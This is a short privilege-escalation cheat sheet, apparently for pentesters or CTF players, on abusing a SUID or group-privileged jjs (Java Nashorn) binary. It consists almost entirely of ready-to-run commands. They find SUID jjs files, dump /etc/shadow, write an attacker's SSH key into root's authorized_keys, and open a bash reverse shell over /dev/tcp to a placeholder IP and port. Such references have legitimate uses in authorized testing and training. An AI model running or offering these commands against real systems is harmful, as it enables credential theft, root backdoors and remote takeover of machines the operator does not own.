# JJS SUID Shell (Java Nashorn Engine)

`jjs` is the Java Nashorn script engine. When SUID-root (or in a privileged group), use it for file read or shell via GTFOBins.

## Find JJS SUID
```bash
find / -perm -4000 -name jjs 2>/dev/null
find / -perm -4000 -name "jjs*" 2>/dev/null
# Or SUID + SGID combo (e.g., root:admin group with admin membership)
find / -perm -6000 -name "jjs*" 2>/dev/null
```

## File Read (GTFOBins)
```bash
echo 'var a=new java.io.BufferedReader(new java.io.InputStreamReader(new java.io.FileInputStream("/etc/shadow")));var b=new java.io.PrintWriter(java.lang.System.out);while((line=a.readLine())!=null){b.println(line);}b.flush();' | jjs
```

## Write SSH Key for Root Shell
```bash
echo 'var FileWriter = Java.type("java.io.FileWriter"); var fw = new FileWriter("/root/.ssh/authorized_keys"); fw.write("<YOUR_PUB_KEY>"); fw.close();' | jjs
```
Then SSH in as root.

## Execute Shell Commands
```bash
echo 'java.lang.Runtime.getRuntime().exec("/bin/bash -c bash$IFS-i$IFS>&/dev/tcp/<IP>/<PORT><&1")' | jjs
# Or simpler:
jjs
# At jjs prompt:
# > java.lang.Runtime.getRuntime().exec(["bash","-c","id"])
```

## Notes
- Works when jjs has SUID or is executable by a privileged group you belong to
- Nashorn runs Java + JavaScript — any Java I/O APIs available
